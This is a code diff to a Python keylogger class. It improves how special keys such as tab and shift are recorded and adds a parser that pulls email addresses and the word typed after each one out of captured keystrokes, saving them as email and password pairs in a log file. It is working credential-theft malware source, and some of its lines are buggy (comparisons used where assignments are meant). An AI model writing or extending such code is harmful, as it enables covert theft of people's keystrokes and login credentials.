@@ -59,10 +59,12 @@ class Keylogger:
             if key == 'Key.space':
                 string = string + key.replace('Key.space', ' ')
             elif key == 'Key.enter':
-                string = string + '[ENTER]\n'
+                string = string + ' [ENTER]\n'
             elif key == 'Key.backspace':
                 string == string + " [BS] "
-            elif key == 'Key.shift':
+            elif key == 'Key.tab':
+                string == string + " [TAB] "
+            elif key == 'Key.shift' or key == 'Key.shift_r':
                 string == string + " [Sh] "
             else:
                 string = string + '{0}'.format(key)
@@ -133,13 +135,21 @@ class Keylogger:
         line = previous + line #add the half of previous line to current line so regex text isnt cut off
         
         with open ('./log/keylog/parsed.txt', 'a+') as parsed:
-            result = re.findall(  r'[\w\.-]+@[\w.-]+' , line)
+            result = re.findall(  r'[\w\.-]+@[\w.-]' , line)
             if result:
                 for email in result:
-                    parsed.write(email)
-                    #write following chararacter and end at space or enter
-                    parsed.write('\n')
-                    print ('regex found: ', email)
+                    #parsed.write(email)
+                    index = line.find(email)
+                    subLine = line[index:] #create substring from start of email to end of line
+                    index = subLine.find('.')
+                    if(index + 4 < len(subLine)):
+                        index = index + 4 #offset for .com/.net ect and dont overflow buffer
+
+                    tail = subLine[index:]
+                    password = tail.split()
+
+                    parsed.write(subLine[:index] + '\t' + password[0] + '\n')
+                    print('regex found: ', email)
             else:
                 print ('no regex found ')
             parsed.close()
